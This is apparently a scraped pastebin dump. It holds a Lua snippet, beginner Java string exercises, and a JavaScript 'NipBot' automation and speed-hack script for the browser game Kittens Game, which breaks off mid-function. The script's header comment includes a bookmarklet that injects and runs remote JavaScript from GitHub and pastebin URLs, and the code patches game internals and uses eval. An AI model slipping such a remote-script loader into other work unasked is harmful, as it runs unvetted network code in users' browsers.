-- json.decode('[1,2,3,{""x"":10}]') -- Returns { 1, 2, 3, { x = 10 } }
json = require(""json"")

turtleUtil = require(""TurtleMovementUtil"")"
g6J9f65v,Day 15 Sample,HarrJ,Java,Sunday 9th of July 2023 07:50:36 PM CDT,"String txt1 = ""The quick brown fox jumps over the lazy dog"";
//using charAt()
for (int i = 0; i < txt1.length(); i++) {
    System.out.print(txt1.charAt(i) +  "", "");
}
// using toCharArray()
char[] txt1Char = txt1.toCharArray();
for (char c : txt1Char) {
    System.out.print(c + ""|"");
}
//-----------------------
char[] charArray1 = {'l','u','p','a','n','g',' '
    ,'h','i','n','i','r','a','n','g'};
int[] vowelCounter = {0,0,0,0,0};
int aCount = 0;
int eCount = 0;
int iCount = 0;
int oCount = 0;
int uCount = 0;
for (char c : charArray1) {
    switch (c) {
        case 'a':
            aCount++;
            vowelCounter[0]++;
            break;
        case 'e':
            eCount++;
            vowelCounter[1]++;
            break;
        case 'i':
            iCount++;
            vowelCounter[2]++;
            break;
        case 'o':
            oCount++;
            vowelCounter[3]++;
            break;
        case 'u':
            uCount++;
            vowelCounter[4]++;
            break;
    }
}
System.out.println(""Total a: "" + aCount);
System.out.println(""Total e: "" + eCount);
System.out.println(""Total i: "" + iCount);
System.out.println(""Total o: "" + vowelCounter[3]);
System.out.println(""Total u: "" + vowelCounter[4]);

//------------------------

package week3training;

public class Day15C {
    public static void main(String[] args) {
        Day15C callMe = new Day15C();
        double[] numberList = {9.8, 273.15, 299,42};
        System.out.println(""Sum of numbers in array are: ""
                + callMe.getSum1(numberList));
        // kelangan pa gamitan ng sout yung getSum Method para makita result
        System.out.println(""using getSum2 method:"");
        callMe.getSum2(numberList);
        
        String txt1 = ""salitaan"";
        System.out.println(txt1);
        callMe.changeText(txt1);
        System.out.println(""After method: "" + txt1);
    }
    
    public double getSum1 (double numArray[]) {
        double sum = 0;
        for (double d : numArray) {
            sum += d;
        }
        return sum;
    }
    
    //using Day12B as a reference
    public void getSum2 (double numArray[]) {
        double sum = 0;
        for (int i = 0; i < numArray.length; i++) {
            double number = numArray[i];
            sum += number;
            if (i < (numArray.length - 1)) {
                System.out.print(number + "" + "");
            } else {
                System.out.print(number + "" = "");
            }
        }
        System.out.println(sum);
    }
    
    public void changeText (String txtRef) {
        txtRef = ""changed"";
    }
}

//--------------------------------------------

package week3training;

public class Day15D {
    // no main method
    public void countVowels (String txtSentence) {
        int aCount = 0;
        int eCount = 0;
        int iCount = 0;
        int oCount = 0;
        int uCount = 0;
        char[] txt1Char = (txtSentence.toLowerCase()).toCharArray();
        for (char c : txt1Char) {
            switch (c) {
                case 'a':
                    aCount++;
                    break;
                case 'e':
                    eCount++;
                    break;
                case 'i':
                    iCount++;
                    break;
                case 'o':
                    oCount++;
                    break;
                case 'u':
                    uCount++;
                    break;
            }
        }
        System.out.println(""Sentence: "" + txtSentence);
        System.out.println(""Total a: "" + aCount);
        System.out.println(""Total e: "" + eCount);
        System.out.println(""Total i: "" + iCount);
        System.out.println(""Total o: "" + oCount);
        System.out.println(""Total u: "" + uCount);
    }
    
    public void capitalizeEachWord (String txtRef) {
        String[] words = txtRef.split("" "");
        String txtRefModded = """";
        for (String word : words) {
            if (!word.isEmpty()) {
                String firstLetter = word.substring(0,1).toUpperCase();
                String remains = word.substring(1).toLowerCase();
                txtRefModded += firstLetter + remains + "" "";
            }
        }
        System.out.println(txtRefModded);
    }
}

//--------------------------------------------

package week3training;

public class Day15E {
    public static void main(String[] args) {
        Day15D callDay15D = new Day15D();
        String txtReference = ""The quick brown fox jumps over the lazy dog."";
        callDay15D.countVowels(txtReference);
        callDay15D.capitalizeEachWord(txtReference);
        System.out.println(""---"");
        
        txtReference = ""Who would know naught of art must learn, act, and then take his ease."";
        callDay15D.countVowels(txtReference);
        callDay15D.capitalizeEachWord(txtReference);
        System.out.println(""***"");
        
        txtReference = ""Lake, tree, pine cone, cool brown soil."";
        callDay15D.countVowels(txtReference);
        callDay15D.capitalizeEachWord(txtReference);
        System.out.println(""~~~"");
        
        txtReference = ""Fat pet pig got drunk, took walk."";
        callDay15D.countVowels(txtReference);
        callDay15D.capitalizeEachWord(txtReference);
        System.out.println(""###"");
        
        txtReference = ""A hidden litter of little kittens."";
        callDay15D.countVowels(txtReference);
        callDay15D.capitalizeEachWord(txtReference);
        
        System.out.println(""----------------"");
        String txt2 = ""magical"";
        System.out.println(txt2.substring(1,4));
        // 1st number = start 
        // 2nd number = index - 1 where to stop
    }
}
"
TSS37BiV,NipBotLast,sinkir,JavaScript,Sunday 9th of July 2023 07:44:28 PM CDT,"/*

(function(){var d=document,s=d.createElement('script');s.src='https://github.com/kitten-science/kitten-scientists/releases/download/v2.0.0-beta.7/kitten-scientists-2.0.0-beta.7.user.js';d.body.appendChild(s);})();


javascript:(function(){var d=document,s=d.createElement('script');s.src='https://pastebin.com/raw/TSS37BiV?.js';d.body.appendChild(s);})();
        _       ____        _     _     
       (_)     |  _ \      | |   (_)    
  _ __  _ _ __ | |_) | ___ | |_   _ ___ 
 | '_ \| | '_ \|  _ < / _ \| __| | / __|
 | | | | | |_) | |_) | (_) | |_ _| \__ \
 |_| |_|_| .__/|____/ \___/ \__(_) |___/
         | |                    _/ |    
         |_|                   |__/     

*/
/*



var enstr = ""\n"";
gamePage.bld.meta[0].meta.forEach(
function(montruck)
{
	enstr += montruck.name+""\t"";
	if(montruck.label)
	{
		enstr += montruck.label+""\n"";
	}
	else if(montruck.stage)
	{
		montruck.stages.forEach(
		function(monmachin)
		{
			enstr += monmachin.label+""\t"";
		});
		enstr += ""\n""
	}
	else
	{
			enstr += montruck.name+"" ?\n"";
	}
});
enstr

  Name			  Label			  Stage2
field			Catnip Field
pasture			Pasture			Solar Farm	
aqueduct		Aqueduct		Hydro Plant	
hut				Hut
logHouse		Log House
mansion			Mansion
library			Library			Data Center	
academy			Academy
observatory		Observatory
biolab			Bio Lab
barn			Barn
warehouse		Warehouse
harbor			Harbour
mine			Mine
quarry			Quarry
smelter			Smelter
calciner		Calciner
steamworks		Steamworks
magneto			Magneto
lumberMill		Lumber Mill
oilWell			Oil Well
workshop		Workshop
factory			Factory
reactor			Reactor
accelerator		Accelerator
tradepost		Tradepost
mint			Mint
amphitheatre	Amphitheatre	Broadcast Tower	
chapel			Chapel
temple			Temple
unicornPasture	Unic. Pasture
ziggurat		Ziggurat
chronosphere	Chronosphere
aiCore			AI Core
zebraOutpost	Zebra Outpost
zebraWorkshop	Zebra Workshop
zebraForge		Zebra Forge


-------------------------------------------

var enstr = """";
gamePage.village.jobNames.forEach(
function(montruck){
enstr += montruck+""\n"";
}
);
enstr

woodcutter
farmer
scholar
hunter
miner
priest
geologist
engineer

-------------------------------------------

var enstr = """";
for (let [key, value] of Object.entries(gamePage.science.metaCache)) {
  //console.log(`${key}: ${value.name}`);
    enstr += `${value.name}`+""\n"";
}
enstr

paradoxalKnowledge
voidSpace
tachyonTheory
dimensionalPhysics
chronophysics
exogeophysics
hydroponics
terraformation
antimatter
superconductors
advExogeology
thorium
exogeology
orbitalEngineering
oilProcessing
sattelites
particlePhysics
nanotechnology
blackchain
quantumCryptography
ai
robotics
rocketry
nuclearFission
ecology
electronics
combustion
metalurgy
mechanization
genetics
biochemistry
industrialization
biology
drama
metaphysics
electricity
chemistry
acoustics
architecture
archeology
physics
navigation
cryptotheology
astronomy
theology
steel
machinery
philosophy
writing
engineering
currency
construction
math
civil
metal
animal
archery
mining
agriculture
calendar
brewery

-------------------------------------------

var enstr = """";
gamePage.workshop.meta[0].meta.forEach(
function(montruck){
enstr += montruck.name+""\n"";
}
);
enstr

mineralHoes
ironHoes
mineralAxes
ironAxes
steelAxe
reinforcedSaw
steelSaw
titaniumSaw
alloySaw
titaniumAxe
alloyAxe
unobtainiumAxe
unobtainiumSaw
stoneBarns
reinforcedBarns
reinforcedWarehouses
titaniumBarns
alloyBarns
concreteBarns
titaniumWarehouses
alloyWarehouses
concreteWarehouses
storageBunkers
energyRifts
stasisChambers
voidEnergy
darkEnergy
chronoforge
tachyonAccelerators
fluxCondensator
lhc
photovoltaic
thinFilm
qdot
solarSatellites
cargoShips
barges
reactorVessel
ironwood
concreteHuts
unobtainiumHuts
eludiumHuts
silos
refrigeration
compositeBow
crossbow
railgun
bolas
huntingArmor
steelArmor
alloyArmor
nanosuits
caravanserai
advancedRefinement
goldOre
geodesy
register
strenghtenBuild
miningDrill
unobtainiumDrill
coalFurnace
deepMining
pyrolysis
electrolyticSmelting
oxidation
steelPlants
automatedPlants
nuclearPlants
rotaryKiln
fluidizedReactors
nuclearSmelters
orbitalGeodesy
printingPress
offsetPress
photolithography
uplink
starlink
cryocomputing
machineLearning
factoryAutomation
advancedAutomation
pneumaticPress
combustionEngine
fuelInjectors
factoryLogistics
factoryOptimization
factoryRobotics
spaceEngineers
aiEngineers
chronoEngineers
spaceManufacturing
celestialMechanics
astrolabe
titaniumMirrors
unobtainiumReflectors
eludiumReflectors
hydroPlantTurbines
amBases
aiBases
amFission
amReactors
amReactorsMK2
voidReactors
relicStation
amDrive
pumpjack
biofuel
unicornSelection
gmo
cadSystems
seti
logistics
augumentation
internet
neuralNetworks
assistance
enrichedUranium
coldFusion
thoriumReactors
enrichedThorium
hubbleTelescope
satnav
satelliteRadio
astrophysicists
mWReactor
eludiumCracker
thoriumEngine
oilRefinery
oilDistillation
factoryProcessing
voidAspiration
distorsion
turnSmoothly

-------------------------------------------

var enstr = """";
gamePage.diplomacy.races.forEach(
function(montruck){
enstr += montruck.name+""\n"";
}
);
enstr

lizards
sharks
griffins
nagas
zebras
spiders
dragons
leviathans

-------------------------------------------
-------------------------------------------
-------------------------------------------
-------------------------------------------
-------------------------------------------

*/
/*
   _____ _       _           _                       
  / ____| |     | |         | |                      
 | |  __| | ___ | |__   __ _| | __   ____ _ _ __ ___ 
 | | |_ | |/ _ \| '_ \ / _` | | \ \ / / _` | '__/ __|
 | |__| | | (_) | |_) | (_| | |  \ V / (_| | |  \__ \
  \_____|_|\___/|_.__/ \__,_|_|   \_/ \__,_|_|  |___/

*/

//Frame count of spiner
var myCount = 0;
//Trigger mySpinner() evry x ticks
var evryTicks = 5;
//Store last trick that triggered mySpinner
var lastTick = 0;
// Array to store craft list, [i][0] = resToCraftName [i][1] = resTriggerName
var craftList = [
[""wood"", ""catnip""],
[""beam"", ""wood""],
[""slab"", ""minerals""],
[""plate"", ""iron""],
[""steel"", ""coal""],
[""manuscript"", ""culture""],
[""kerosene"", ""oil""],
[""thorium"", ""uranium""],
[""alloy"", ""titanium""],
[""eludium"", ""unobtainium""]
];
var myConfig = {
speed			 	:1,
speedTmp			:1,

autoObserveBtn	 	:false,
autoHunt			:false,
autoHuntSec			:10,
autoPraise			:false,
autoPraiseSec		:10,

autoTradeZebras						:false,
autoTradeZebrasTitaniumPerCent		:80,
autoTradeZebrasSpend				:20,
autoTradeLeviathans					:false,
autoTradeLeviathansSec				:10,
autoTradeLeviathansSpend			:40,
autoTradeBcoin						:false,
autoTradeBcoinBuyMax				:1000,
autoTradeBcoinSellMin				:1088,
autoCombustTC						:false,
autoCombustTCHeat					:10,
autoCombustTCNb						:1,
autoResetPraise						:false,
autoResetPraiseUnit					:999999,

autoFurs			:false,
autoFursSec			:10,
autoCompedium		:false,
autoCompediumSec	:10,
autoCompediumSpend	:2,
autoBlueprint		:false,
autoBlueprintSec	:10,
autoBlueprintSpend	:1,


wood				:false,
woodSec				:10,
woodSpend			:10,
beam				:false,
beamSec				:10,
beamSpend			:10,
slab				:false,
slabSec				:10,
slabSpend			:10,
plate				:false,
plateSec			:10,
plateSpend			:10,
steel				:false,
steelSec			:10,
steelSpend			:10,
manuscript			:false,
manuscriptSec		:10,
manuscriptSpend		:1,
kerosene			:false,
keroseneSec			:10,
keroseneSpend		:10,
thorium				:false,
thoriumSec			:10,
thoriumSpend		:10,
alloy				:false,
alloySec			:10,
alloySpend			:10,
eludium				:false,
eludiumSec			:10,
eludiumSpend		:10

};
if(!!localStorage.getItem(""nipBotConfig""))
{
	myConfig = JSON.parse(localStorage.getItem(""nipBotConfig""));
}


/*
  _____       _           _    
 |_   _|     (_)         | |   
   | |  _ __  _  ___  ___| |_  
   | | | '_ \| |/ _ \/ __| __| 
  _| |_| | | | |  __/ (__| |_  
 |_____|_| |_| |\___|\___|\__| 
            _/ |               
           |__/                
*/


game.server.refreshNiped = game.server.refresh;
game.server.refreshNipedCount = 0;
game.server.refresh = function (){

	game.server.refreshNipedCount++;
	if(game.server.refreshNipedCount > (myConfig.speed * 100))
	{
		game.server.refreshNiped();
		game.server.refreshNipedCount = 0;
	}
}



game.resetAutomaticNiped = game.resetAutomatic;
game.resetAutomatic = function (){
	myTurnOffJobs();
	game.resetAutomaticNiped();
}


gamePage.time.gainTemporalFlux = function (timestamp){
	if (!this.game.science.get(""calendar"").researched){
		return;
	}

	var now = Date.now();
	var delta = now - ( timestamp || 0 );
	if (delta <= 0){
		return;
	}

	// Update temporalFluxMax from values loaded
	this.game.updateCaches();
	this.game.resPool.update();

	var temporalAccelerator = this.getCFU(""temporalAccelerator"");
	var energyRatio = 1 + (temporalAccelerator.val * temporalAccelerator.effects[""timeRatio""]);
	var temporalFluxGained = Math.round(delta / ( 60 * 1000 ) * (this.game.ticksPerSecond * energyRatio)); // 5 every 60 seconds
	temporalFluxGained = Math.round(temporalFluxGained * myConfig.speed)
	var temporalFluxAdded = this.game.resPool.addResEvent(""temporalFlux"", temporalFluxGained);

	var bonusSeconds = Math.floor(temporalFluxAdded / this.game.ticksPerSecond);
	if (bonusSeconds > 0){
		this.game.msg(""You have recharged "" + bonusSeconds + "" second""
			+ (bonusSeconds > 1 ? ""s"" : """") + "" of temporal flux"");
	}
}




gamePage.timer.updateScheduledEvents = function()
{
	nipBot();
	for (var i in this.scheduledHandlers)
	{
		this.scheduledHandlers[i]();
	}
	this.scheduledHandlers = [];
};

document.getElementById('motd').innerHTML += ""&nbsp;<a href='#' class='myAnimStart' id='mySpinner' onclick='toggleMenu();'>?</a>"";

setTimeout(function (){
	g('mySpinner').className = ""myAnimEnd"";
}, 1000);
setTimeout(function (){
	g('mySpinner').className = """";
}, 5000);

mySpinner();
injectCss();
injectHtmlMenu();

if(!gamePage.nipUpdateModel){gamePage.nipUpdateModel = gamePage.updateModel;}
gamePage.updateModel = function()
{
	for(var myi = 0; myi < myConfig.speed; myi++)
	{
		if(myi != 0)
		{
			game.calendar.tick();
		}
		game.nipUpdateModel();
	}
}


/*
  ______                      _    _ _____ 
 |  ____|                    | |  | |_   _|
 | |__ _   _ _ __   ___ ___  | |  | | | |  
 |  __| | | | '_ \ / __/ __| | |  | | | |  
 | |  | |_| | | | | (__\__ \ | |__| |_| |_ 
 |_|   \__,_|_| |_|\___|___/  \____/|_____|
                                           
*/
function g(id)
{
	return document.getElementById(id);
}
function gr(id)
{
	return gamePage.resPool.get(id);
}
function myLast(arr)
{
	return arr[arr.length -1];
}
function getRace(race)
{
	for(var i=0;i<gamePage.diplomacyTab.racePanels.length;i++)
	{
		if(gamePage.diplomacyTab.racePanels[i].race.name == race)
		{
			return gamePage.diplomacyTab.racePanels[i].race;
		}
	}
	return false;
}
function getWorkshop(upgrade)
{
	for(var i=0;i<gamePage.workshop.meta[0].meta.length;i++)
	{
		if(gamePage.workshop.meta[0].meta[i].name == upgrade)
		{
			return gamePage.workshop.meta[0].meta[i];
		}
	}
	return false;
}



function toggleMenu()
{
	
	if(g('myMenuId').style.display == ""none"")
	{
		myConfig.speedTmp = myConfig.speed;
		myConfig.speed = 1;
		printHtmlMenu();
		g('myMenuId').style.display = ""block"";
	}
	else
	{
		myConfig.speed = myConfig.speedTmp;
		
		mySaveConfig();
		g('myMenuId').style.display = ""none"";
	}
}

function mySpinner()
{	
	var frames = ['⠋','⠛','⠙','⠹','⠸','⢸','⢰','⣰','⣠','⣤','⣄','⣆','⡆','⡇','⠇','⠏'];

	document.getElementById('mySpinner').innerHTML = """"+frames[myCount];
	myCount++;
	if(myCount >= frames.length)
	{
		myCount = 0;
	}
}



function printCss()
{
	var cssCode = """";
	cssCode += `
	
#mySpinner
{
	text-decoration:none;
	transition: transform ease 4s, background-color ease 4s;
	transform-origin: left top;
}
.myAnimStart
{
	position: fixed;
	transform: scale(30);
	background-color:rgba(30,30,30,0.6);
}
.myAnimEnd
{
	position: fixed;
	transform: scale(1);
	background-color:rgba(200,200,200,0);

}

.close
{
	transition : background-color ease 0.3s;
}
.close:hover
{
	background-color:rgba(255,0,0,0.3);
}

.scheme_grassy #myMenuId
{
	padding: 30px;
	background-color: #C6EBA1;	
}
#myMenuIdTable
{
	text-align:center;
	width:100%;
}
#myMenuIdTable > tbody > tr > td
{
	padding:8px 0 8px 0;
}

	`;
	return cssCode;
	
}


function printHtmlMenu()
{

	var myStrHtml = """"
	myStrHtml = `
<a href=""#"" class=""close"" onclick=""toggleMenu();"" style=""position: absolute; top: 0px; right: 0px; padding:16px;"">close</a>

<table id=""myMenuIdTable""><tbody>
<tr>
<td style=""text-align:right;""><input id=""autoObserveBtn"" type=""checkbox"" `+((myConfig.autoObserveBtn) ? ""checked"" : """")+`>
<label for=""autoObserveBtn"">Auto Observe </label></td><td style=""text-align:left;""> the Sky </td><td> </td><td> </td><td> </td><td> </td>
</tr>
	
<tr style=""display:`+((gr(""manpower"").unlocked) ? ""table-row"" : ""none"")+`"">
<td><input id=""autoHunt"" type=""checkbox"" `+((myConfig.autoHunt) ? ""checked"" : """")+`>
<label for=""autoHunt"">Auto send </td><td>hunters</td><td> if </td><td>`	+gr('manpower').title+` </td><td> will be full in </label>	</td><td><input type=""number"" id=""autoHuntSec"" value=""`+(myConfig.autoHuntSec)+`"" style=""width:8ch"" /> seconds</td>
</tr>
	
<tr style=""display:`+((gr(""faith"").unlocked) ? ""table-row"" : ""none"")+`"">
<td><input id=""autoPraise"" type=""checkbox"" `+((myConfig.autoPraise) ? ""checked"" : """")+`>
<label for=""autoPraise"">Auto Praise </td><td> the sun</td><td> if </td><td>`+gr('faith').title+` </td><td> will be full in </label>	</td><td><input type=""number"" id=""autoPraiseSec"" value=""`+(myConfig.autoPraiseSec)+`"" style=""width:8ch"" /> seconds</td>
</tr>

<tr style=""display:`+((gamePage.workshop.getCraft(""parchment"").unlocked) ? ""table-row"" : ""none"")+`"">
<td><input id=""autoFurs"" type=""checkbox"" `+((myConfig.autoFurs) ? ""checked"" : """")+`>
<label for=""autoFurs"">Auto Craft </td><td>`+gr(""parchment"").title+` </td><td> if </td><td>`+gr('furs').title+` </td><td> is more than </label>	</td><td><input type=""number"" id=""autoFursSec"" value=""`+(myConfig.autoFursSec)+`"" style=""width:18ch"" /> units&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
</tr>
<tr style=""display:`+((gamePage.workshop.getCraft(""compedium"").unlocked) ? ""table-row"" : ""none"")+`"">
<td><input id=""autoCompedium"" type=""checkbox"" `+((myConfig.autoCompedium) ? ""checked"" : """")+`>
<label for=""autoCompedium"">Auto Craft </td><td>`+gr(""compedium"").title+` </td><td> if </td><td> `+gr(""science"").title+` </td><td> will be full in </label> </td><td><input type=""number"" id=""autoCompediumSec"" value=""`+(myConfig.autoCompediumSec)+`"" style=""width:8ch"" /> sec, spend <input type=""number"" min=""1"" max=""100"" id=""autoCompediumSpend"" value=""`+(myConfig.autoCompediumSpend)+`"" style=""width:8ch"" />&#37;</td>
</tr>
<tr style=""display:`+((gamePage.workshop.getCraft(""blueprint"").unlocked) ? ""table-row"" : ""none"")+`"">
<td><input id=""autoBlueprint"" type=""checkbox"" `+((myConfig.autoBlueprint) ? ""checked"" : """")+`>
<label for=""autoBlueprint"">Auto Craft </td><td>`+gr(""blueprint"").title+` </td><td> if </td><td> `+gr(""science"").title+` </td><td> will be full in </label> </td><td><input type=""number"" id=""autoBlueprintSec"" value=""`+(myConfig.autoBlueprintSec)+`"" style=""width:8ch"" /> sec, spend <input type=""number"" min=""1"" max=""100"" id=""autoBlueprintSpend"" value=""`+(myConfig.autoBlueprintSpend)+`"" style=""width:8ch"" />&#37;</td>
</tr>

<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>

<tr style=""display:`+((getRace(""zebras"").unlocked) ? ""table-row"" : ""none"")+`"">
<td><input id=""autoTradeZebras"" type=""checkbox"" `+((myConfig.autoTradeZebras) ? ""checked"" : """")+`>
<label for=""autoTradeZebras"">Auto Trade </td><td>`+getRace(""zebras"").title+`</td><td> if </td><td>`	+gr('titanium').title+` </td><td> is lower than </label>	</td><td><input type=""number"" min=""0"" max=""100"" id=""autoTradeZebrasTitaniumPerCent"" value=""`+(myConfig.autoTradeZebrasTitaniumPerCent)+`"" style=""width:8ch"" />&#37; try to send <input type=""number"" id=""autoTradeZebrasSpend"" value=""`+(myConfig.autoTradeZebrasSpend)+`"" style=""width:8ch"" /> trades</td>
</tr>

<tr style=""display:`+((getRace(""leviathans"").unlocked) ? ""table-row"" : ""none"")+`"">
<td><input id=""autoTradeLeviathans"" type=""checkbox"" `+((myConfig.autoTradeLeviathans) ? ""checked"" : """")+`>
<label for=""autoTradeLeviathans"">Auto Trade </td><td>`+getRace(""leviathans"").title+`</td><td> if </td><td>`	+gr('unobtainium').title+` </td><td> will be full in </label>	</td><td><input type=""number"" id=""autoTradeLeviathansSec"" value=""`+(myConfig.autoTradeLeviathansSec)+`"" style=""width:8ch"" /> sec, spend <input type=""number"" min=""1"" max=""100"" id=""autoTradeLeviathansSpend"" value=""`+(myConfig.autoTradeLeviathansSpend)+`"" style=""width:8ch"" />&#37;</td>
</tr>

<tr style=""display:`+((gr(""blackcoin"").unlocked) ? ""table-row"" : ""none"")+`"">
<td><input id=""autoTradeBcoin"" type=""checkbox"" `+((myConfig.autoTradeBcoin) ? ""checked"" : """")+`>
<label for=""autoTradeBcoin"">Auto Trade </td><td>`+gr(""blackcoin"").title+`</td><td> Buy if </td><td>` +gr('blackcoin').title+` </td><td>price is lower than </label>	</td><td><input type=""number"" id=""autoTradeBcoinBuyMax"" value=""`+(myConfig.autoTradeBcoinBuyMax)+`"" style=""width:8ch"" /> , Sell if pice is higher than <input type=""number"" id=""autoTradeBcoinSellMin"" value=""`+(myConfig.autoTradeBcoinSellMin)+`"" style=""width:8ch"" /> </td>
</tr>

<tr style=""display:`+((gamePage.religion.meta[1].meta[8].val) ? ""table-row"" : ""none"")+`"">
<td><input id=""autoResetPraise"" type=""checkbox"" `+((myConfig.autoResetPraise) ? ""checked"" : """")+`>
<label for=""autoResetPraise"">Auto Reset </td><td>`+gr(""faith"").title+` </td><td> if accumulated</td><td>`+gr('faith').title+` </td><td> is more than </label>	</td><td><input type=""number"" id=""autoResetPraiseUnit"" value=""`+(myConfig.autoResetPraiseUnit)+`"" style=""width:18ch"" /> units&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
</tr>

<tr style=""display:`+((getWorkshop(""chronoforge"").unlocked && gr(""timeCrystal"").unlocked) ? ""table-row"" : ""none"")+`"">
<td><input id=""autoCombustTC"" type=""checkbox"" `+((myConfig.autoCombustTC) ? ""checked"" : """")+`>
<label for=""autoCombustTC"">Auto Combust </td><td>`+gr(""timeCrystal"").title+`</td><td> if </td><td>heat</td><td> is lower than </label>	</td><td><input type=""number"" id=""autoCombustTCHeat"" value=""`+(myConfig.autoCombustTCHeat)+`"" style=""width:8ch"" /> , Combust 
<select id=""autoCombustTCNb"">
    <option value=""1"" `+((myConfig.autoCombustTCNb == 1)? `selected` : `` )+`>1</option>
    <option value=""5"" `+((myConfig.autoCombustTCNb == 5)? `selected` : `` )+`>5</option>
    <option value=""45"" `+((myConfig.autoCombustTCNb == 45)? `selected` : `` )+`>45</option>
    <option value=""500"" `+((myConfig.autoCombustTCNb == 500)? `selected` : `` )+`>500</option>
</select> TC</td>
</tr>


<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>

	`;
	// <input type=""number"" id=""autoCombustTCNb"" value=""`+(myConfig.autoCombustTCNb)+`"" style=""width:8ch"" />
	//gamePage.time.heat
	myStrHtml += genCraftList();
	myStrHtml += `</body></table><br><br>&nbsp;&nbsp;&nbsp;!Déja Vus ! speed : <input id=""mySpeed"" type=""number"" min=""1"" max=""640"" value=""`+(myConfig.speedTmp)+`"" style=""width:5ch""><br><br>
	<a href=""#"" class=""close"" onclick=""toggleMenu();"" style=""position: relative; top: 0px; right: 0px; padding:16px;"">close</a>
	<br><br>`;
	
	
	g(""myMenuId"").innerHTML = myStrHtml;

}

function genCraftList()
{
	var myStr = """";
	var trDisplay = """";
	craftList.forEach(function(truck){	
	//if(gamePage.workshop.getCraft(truck[0]).unlocked)
	//{
	
	console.log(truck[0]+"" et ""+truck[0]);

	if( (gamePage.workshop.getCraft(truck[0]).unlocked && gr(truck[0]).unlocked && gr(truck[1]).unlocked) )
	{
		trDisplay = ""table-row"";
	}
	else
	{
		trDisplay = ""none"";
	}
	console.log(trDisplay);
		myStr += `
<tr style=""display:`+trDisplay+`"">
<td><input id=""auto`+truck[0]+`"" type=""checkbox""  `+( (eval(""myConfig.""+truck[0]) ) ? ""checked"" : """")+`>
<label for=""auto`+truck[0]+`"">Auto Craft </td><td>`+gr(truck[0]).title+` </td><td> if </td><td> `+gr(truck[1]).title+` </td><td> will be full in </label> </td><td><input type=""number"" id=""auto`+truck[0]+`Sec"" value=""`+(eval('myConfig.'+truck[0]+'Sec'))+`"" style=""width:8ch"" /> sec, spend <input type=""number"" min=""1"" max=""100"" id=""auto`+truck[0]+`Spend"" value=""`+(eval('myConfig.'+truck[0]+'Spend'))+`"" style=""width:8ch"" />&#37;</td>
</tr>
		`;
	//}
	})	
	return myStr;
}

function injectCss()
{
	var cssCode = printCss();
	var styleElement = document.createElement(""style"");
	styleElement.type = ""text/css"";
	if (styleElement.styleSheet)
	{
		styleElement.styleSheet.cssText = cssCode;
	} 
	else
	{
		styleElement.appendChild(document.createTextNode(cssCode));
	}
	document.getElementsByTagName(""head"")[0].appendChild(styleElement);
	
}

function injectHtmlMenu()
{
	var myDiv = document.createElement(""div"");
	//myDiv.innerHTML = myStrHtml;
	myDiv.setAttribute(""class"", ""dialog help"");
	myDiv.setAttribute(""style"", ""height: 72vh !important;top:225px !important;display:none; overflow:auto;width:720px;margin-left:-30%;"");
	myDiv.setAttribute(""id"", ""myMenuId"");
	document.body.appendChild(myDiv);
}

function myTurnOffJobs()
{
myConfig.autoHunt			= false;
myConfig.autoPraise			= false;

myConfig.autoTradeZebras		= false;
myConfig.autoTradeLeviathans	= false;
myConfig.autoTradeBcoin			= false;
myConfig.autoCombustTC			= false;
myConfig.autoResetPraise		= false;

myConfig.autoFurs			= false;
myConfig.autoCompedium		= false;
myConfig.autoBlueprint		= false;

myConfig.wood				= false;
myConfig.beam				= false;
myConfig.slab				= false;
myConfig.plate				= false;
myConfig.steel				= false;
myConfig.manuscript			= false;
myConfig.kerosene			= false;
myConfig.thorium			= false;
myConfig.alloy				= false;
myConfig.eludium			= false;

localStorage.setItem(""nipBotConfig"", JSON.stringify(myConfig));
}

function mySaveConfig()
{
	
myConfig.speed 				= g('mySpeed').value;
//console.log(myConfig.speed);
if(myConfig.speed < 1 || myConfig.speed > 640){myConfig.speed = 1}

myConfig.autoObserveBtn 	= g('autoObserveBtn').checked;
myConfig.autoHunt			= g('autoHunt').checked;
myConfig.autoHuntSec		= g('autoHuntSec').value;
myConfig.autoPraise			= g('autoPraise').checked;
myConfig.autoPraiseSec		= g('autoPraiseSec').value;

myConfig.autoTradeZebras					= g('autoTradeZebras').checked;
myConfig.autoTradeZebrasTitaniumPerCent		= g('autoTradeZebrasTitaniumPerCent').value;
myConfig.autoTradeZebrasSpend				= g('autoTradeZebrasSpend').value;
myConfig.autoTradeLeviathans				= g('autoTradeLeviathans').checked;
myConfig.autoTradeLeviathansSec				= g('autoTradeLeviathansSec').value;
myConfig.autoTradeLeviathansSpend			= g('autoTradeLeviathansSpend').value;
myConfig.autoTradeBcoin						= g('autoTradeBcoin').checked;
myConfig.autoTradeBcoinBuyMax				= g('autoTradeBcoinBuyMax').value;
myConfig.autoTradeBcoinSellMin				= g('autoTradeBcoinSellMin').value;
myConfig.autoCombustTC						= g('autoCombustTC').checked;
myConfig.autoCombustTCHeat					= g('autoCombustTCHeat').value;
myConfig.autoCombustTCNb					= g('autoCombustTCNb').value;
//myConfig.autoCombustTCNb					= g('autoCombustTCNb').selected;
myConfig.autoResetPraise					= g('autoResetPraise').checked;
myConfig.autoResetPraiseUnit				= g('autoResetPraiseUnit').value;

myConfig.autoFurs			= g('autoFurs').checked;
myConfig.autoFursSec		= g('autoFursSec').value;
myConfig.autoCompedium		= g('autoCompedium').checked;
myConfig.autoCompediumSec	= g('autoCompediumSec').value;
myConfig.autoCompediumSpend	= g('autoCompediumSpend').value;
myConfig.autoBlueprint		= g('autoBlueprint').checked;
myConfig.autoBlueprintSec	= g('autoBlueprintSec').value;
myConfig.autoBlueprintSpend	= g('autoBlueprintSpend').value;


myConfig.wood				= g('autowood').checked;
myConfig.woodSec			= g('autowoodSec').value;
myConfig.woodSpend			= g('autowoodSpend').value;
myConfig.beam				= g('autobeam').checked;
myConfig.beamSec			= g('autobeamSec').value;
myConfig.beamSpend			= g('autobeamSpend').value;
myConfig.slab				= g('autoslab').checked;
myConfig.slabSec			= g('autoslabSec').value;
myConfig.slabSpend			= g('autoslabSpend').value;
myConfig.plate				= g('autoplate').checked;
myConfig.plateSec			= g('autoplateSec').value;
myConfig.plateSpend			= g('autoplateSpend').value;
myConfig.steel				= g('autosteel').checked;
